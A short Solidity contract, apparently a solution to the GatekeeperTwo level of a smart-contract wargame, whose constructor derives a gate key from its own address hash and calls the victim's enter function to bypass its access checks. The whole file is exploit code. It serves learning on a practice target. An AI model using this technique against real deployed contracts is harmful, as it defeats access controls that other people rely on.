pragma solidity ^0.6.0;

import './GatekeeperTwo.sol';
contract GatekeeperTwoAttack{
    constructor(GatekeeperTwo _victim) public{
        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;
        _victim.enter(gateKey);
    }

}